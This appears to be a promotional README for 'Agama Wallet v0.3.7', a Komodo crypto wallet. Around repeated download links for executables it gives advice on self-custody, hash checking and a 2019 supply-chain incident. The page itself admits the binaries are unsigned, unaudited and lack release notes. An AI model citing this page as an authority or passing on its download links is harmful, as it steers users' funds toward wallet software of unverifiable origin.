[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Is Agama Wallet Safe? What Can and Cannot Be Verified

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet is non-custodial: keys are generated on the device and encrypted with the wallet password. Two things can now be checked that could not before  -  the source is public under an MIT licence, and each file in the 0.3.7 release carries a published hash value. That still leaves the phrase as the only recovery path, and no support channel can restore it. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps.

## You'll see this if

You are about to put value into a wallet and want to know what is actually checkable, rather than whether a page says it is secure.

| Question | What can be verified | What cannot |
|---|---|---|
| Who holds the keys? | Locally generated, encrypted; no account holds funds | Nothing about your device's security |
| Is the code public? | Yes  -  a public repository under an MIT licence | That the published binary was built from it |
| Is the download genuine? | Each release file carries a hash value you can compare | Who signed it, since there is no signed statement |
| Are there release notes? | No  -  the release carries no description | What changed between versions |
| Is there a phone build? | No, the release is desktop only | Whether one is planned |

## Why it happens

Self-custody is a security model, not a guarantee. It moves the failure modes to you: a lost phrase, a compromised device, a malicious build. The publisher cannot reverse a transaction or restore access, and nothing in the software changes that.

Three specifics shape the risk for this wallet:

- **The source is readable.** A public repository under an MIT licence means the code can be audited by anyone who wants to, and that the licence permits it. Readable is not the same as audited  -  no audit is published  -  but the claim "the code is public" is now checkable rather than asserted.
- **Downloads are checkable.** The 0.3.7 release prints a hash value beside each file, so a download can be compared against a number the publisher produced. That closes the gap where an intercepted file looked identical to a genuine one. What it does not do is prove who published it, because there is no signed statement to verify.
- **The lineage carries an incident.** In 2019, malicious code in an npm dependency used through the EasyDEX interface sent recovery material to a remote server. The current repository is a different codebase from that build, and reading its history is how you satisfy yourself about that rather than taking it on trust.

## Fix

Safety here is a checklist, not a verdict someone else supplies.

1. **Check the hash value before installing.** Compare the file with the number on the release page; a mismatch means stop.
2. **Read the licence and the source.** MIT tells you what you may do with the code; the code tells you what it does. Neither requires you to be a developer to see that the repository is real.
3. **Keep the hot balance small.** A compromise is not reversible, so treat the wallet as a spending tool and hold savings elsewhere.
4. **Treat the phrase as the wallet.** Never share, type or send it: no site, chat, form or helper needs it, and anyone asking is taking the wallet.
5. **Prefer a machine you control.** A wallet is as private as the device it runs on.
6. **Decide what the wallet is for.** Long-term savings in software with no audit and no release notes is a different decision from spending money.

[The 2019 Agama vulnerability](https://github.com/agama-wallet/agama-wallet/blob/main/the-2019-supply-chain-incident.md) covers the incident in detail, and [are atomic swaps safe](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md) separates protocol risk from software risk.

## If that did not work

If a hash value does not match, delete the file. Do not install it and do not look for a workaround; the comparison exists to stop exactly this.

If an update arrives through a channel you did not expect, do not install it. Take builds from the release page only.

If funds move without your action, treat the device as compromised and move remaining balances from a different machine rather than cleaning the original.

If someone offers to recover funds for a fee, they are not a support channel. Without the phrase there is no recovery path, and any claim otherwise is false.

## Prevention

- **Compare the value every time**, not only the first time.
- **Separate savings from spending.** [Backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers what to protect and how.
- **Do not reuse a phrase across wallets.** A compromise in one place becomes a compromise everywhere.
- **Read the commit history, not the badge.** [Open-source UTXO projects](https://github.com/agama-wallet/utxo/blob/main/open-source-projects-worth-reading.md) explains what a licence does and does not tell you.
- **Keep the installer** until the next version works, so a bad build is reversible.

## FAQ

### Is Agama Wallet custodial?

No. Keys are generated and stored on your device, encrypted with your password, and no account holds the funds. The trade-off is that nobody can restore access for you.

### Are the downloads verified?

Each file in the 0.3.7 release carries a hash value you can compare with what you downloaded. That proves the file matches the release; it does not prove who published the release, because no signed statement accompanies it.

### Is the wallet open source?

Yes: the repository is public and licensed under MIT, so the code can be read and reused under that licence. No security audit of it has been published.

### What can I check in five minutes?

Three things: that the repository exists and holds code, that the release prints a hash value beside each file, and that your download matches it. All three are observable without technical skill beyond copying a file name.

### Is the 2019 vulnerability still a risk?

The incident was in a dependency used by a 2019 build of a different codebase. Whether the current release shares any of that exposure is a question for the code and its history, not for a page's reassurance.

### Does self-custody make a wallet safer?

It changes who is responsible, not how much risk exists. Exchange custody adds counterparty risk; self-custody replaces it with device, phrase and software risk, all of which sit with you.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet Download and Install: What Is Available](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md)
- [The 2019 Agama Wallet Vulnerability, Explained](https://github.com/agama-wallet/agama-wallet/blob/main/the-2019-supply-chain-incident.md)
- [Open-Source UTXO Projects Worth Reading](https://github.com/agama-wallet/utxo/blob/main/open-source-projects-worth-reading.md)
- [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md)
